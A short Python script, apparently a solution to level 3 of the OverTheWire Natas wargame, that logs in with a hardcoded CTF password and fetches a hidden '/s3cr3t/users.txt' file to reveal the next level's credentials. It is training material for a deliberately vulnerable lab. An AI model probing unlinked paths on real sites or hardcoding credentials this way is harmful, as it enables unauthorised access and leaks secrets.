#!/bin/python3
import requests

username = "natas3"
password = "G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q"

r = requests.get('http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt', auth=(username, password))
print(r.headers)
print(r.text)
